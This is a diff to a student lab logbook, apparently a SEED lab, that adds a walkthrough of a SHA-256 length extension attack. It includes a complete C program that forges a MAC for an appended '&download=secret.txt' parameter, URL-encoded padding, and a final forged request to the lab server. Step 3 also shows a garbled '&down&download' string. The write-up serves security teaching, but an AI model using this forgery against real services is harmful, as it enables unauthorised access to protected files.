@@ -130,7 +130,7 @@ url = build_url(name, uid, lstcmd=True)
 print("URL:", url)
 ```
 
-### Task 2
+### Task 2 : Create Padding
 
 To explore the hash extension attack, we first need to understand how padding works in SHA‑256.  
 SHA‑256 processes data in **64‑byte blocks**, which means the message must be padded so that its length becomes a multiple of 64 bytes.
@@ -184,3 +184,90 @@ Which leaves us with the final result of :
 "\x00\x00\x00\x00\x00\x00\x01\x60"
 ```
 
+### Task 3: The Length Extension Attack
+
+In this task, we put everything together.  
+We already have the original request from Task 1 and the correct padding from Task 2. The remaining steps are to append the length-extension attack to the URL and forge a new MAC that validates both the padding and the malicious command added to the original message.
+
+To do this, we use the script provided in the lab, making two key modifications:
+- Replace the original MAC with the one we calculated in Task 1.
+- Modify the `SHA256_Update` call from  
+
+```c
+SHA256_Update(&c, "Extra message", 13);
+```
+
+to:
+```c
+SHA256_Update(&c, "&download=secret.txt", 20);
+```
+where the second argument is the injected malicious command and the third argument is its length.
+
+Below is the final script used to calculate the new forged MAC:
+
+```c
+/* length_ext.c */
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <openssl/sha.h>
+int main(int argc, const char *argv[])
+{
+    int i;
+    unsigned char buffer[SHA256_DIGEST_LENGTH];
+    SHA256_CTX c;
+    SHA256_Init(&c);
+    for(i=0; i<64; i++)
+        SHA256_Update(&c, "*", 1);
+
+    // MAC of the original message M (padded)
+
+    c.h[0] = htole32(0xaa969910);
+    c.h[1] = htole32(0x69fac7d8);
+    c.h[2] = htole32(0x334c1991);
+    c.h[3] = htole32(0x1d823102);
+    c.h[4] = htole32(0x23cd005f);
+    c.h[5] = htole32(0x828edcb3);
+    c.h[6] = htole32(0x9af61e73);
+    c.h[7] = htole32(0x5d85b46a);
+
+    // Append additional message
+    SHA256_Update(&c, "&download=secret.txt", 20);
+    SHA256_Final(buffer, &c);
+    for(i = 0; i < 32; i++) {
+        printf("%02x", buffer[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+Generating us the following new MAC: `73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f`
+
+#### Putting it all together
+
+1. The existing request:
+```h
+http://www.seedlab-hashlen.com/?myname=JoseFerreira&uid=1003&lstcmd=1
+```
+2. Adding the padding in url format:
+```h
+%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%60
+```
+
+3. Malicious command:
+```h
+&down&download=secret.txt
+```
+
+4. Adding our new forged mac:
+
+```h
+&mac=73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f
+```
+
+Final url:
+```h
+http://www.seedlab-hashlen.com/?myname=JoseFerreira&uid=1003&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%60&down&download=secret.txt&mac=73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f
+```
+
+![Logbook 10 MacResponse](../images/logbook10/task3/TASK3result.png)
